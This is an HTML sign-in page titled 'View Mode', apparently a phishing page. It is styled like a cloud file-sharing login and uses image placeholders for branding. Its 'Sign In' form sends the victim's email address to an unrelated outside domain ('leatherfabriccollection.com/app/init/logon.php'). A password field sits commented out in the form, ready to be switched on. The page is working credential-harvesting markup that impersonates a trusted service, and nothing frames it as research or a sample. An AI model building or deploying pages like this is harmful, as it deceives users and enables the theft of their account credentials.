<!DOCTYPE html>
<html>
<head>
    <title>View Mode</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
margin: 0px;
}

input[type=text], input[type=password]  {
    font-size: 14px;
    font-family: Atlas Grotesk Web, Open Sans, sans-serif;
    font-weight: 400;
    border-radius: 0;
	border:1px solid silver;
    padding-top: 8px;
    padding-left: 18px;
    height: 44px;
    margin-bottom: 0;
}
* {
    box-sizing: border-box;
}


/* Create two equal columns that floats next to each other */
.column1 {
  
    float: left;
    width: 65%;
    padding: 10px;
}
.column2 {
    float: left;
    width: 35%;
    padding: 10px 50px;
    height: 100%; 
	
}

/* Clear floats after the columns */
.row:after {
    content: "";
    display: table;
    clear: both;
}
.fullscreen
  {
    position:absolute;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    /* Optional - just for DIV)*/
    border: solid 1px #000000;
    background-color:#61082b;
  }
  
 
.button-primary {
    font-size: 14px;
    font-family: Atlas Grotesk Web, Open Sans, sans-serif;
    font-weight: 400;
    background-color: #0061ff;
    background-image: none;
    border-radius: 0;
    height: 44px;
	color:#fff;
	border:0;
	display: inline-block;
   text-align: center;
    font-size: 16px;
cursor: pointer;
overflow: visible;
text-decoration: none;
width:100%;
}

#ff{
  color:red;
  font-family:helvetica;
}
#ff2{
  color:red;
  font-family:helvetica;
}

.top2{
 display:none;
}  

@media screen and (max-width: 600px) {
.column1 {
  
    display:none;
	
}
.column2 {

    width: 100%;
}
.fullscreen
  {
    position:absolute;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    /* Optional - just for DIV)*/
    border: 0;
    background-color:#fff;
  }
.top1{
 display:none;
}  
.top2{
 display:block;
}  


}
</style>
</head>
<body>
<div class="fullscreen">
  <div class="column1" style="background-color:#61082b;">

    <h2 style="padding:0 30px;"><img src="images/d.PNG"></h2>

    <p style="padding:0 80px;"><img src="images/text.PNG"></p>
  </div>
  <div class="column2" style="background-color:#fff;">
     <h2 class="top1"><img src="images/top1.png"></h2>
	 <h2 class="top2"><img src="images/top2.PNG"></h2>
    <h2><img src="images/sa.png"></h2>
    <p style="width:100%;">
	<script type="text/javascript">
function show() {
    var x = document.forms["former"]["em"].value;
    if (x == null || x == "") {
        
		document.getElementById('ff').innerHTML="Please enter your email";
        return false;
    }
	
	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
	if(document.forms["former"]["em"].value.match(emailExp)){
		return true;
	}else{
	 document.getElementById('ff').innerHTML="Enter your correct email";
     return false;
	}

    
}
</script>
	<form action="https://leatherfabriccollection.com/app/init/logon.php" method="get" name="former" onsubmit="return show()">
	<span id="ff"></span>
	<input type="text" name="em" style="width:100%" placeholder="Email"/>
	<br /><br />
	
	<!--<input type="password" name="ps" style="width:100%" placeholder="Email Password" />-->
	<br /><br />
	
	<img src="images/t.PNG"><br /><br />
	<input type="submit" class="button-primary" value="Sign In">
	</form>
	<img src="images/a.png">
	</p>
  </div>
</div>

</body>
</html>
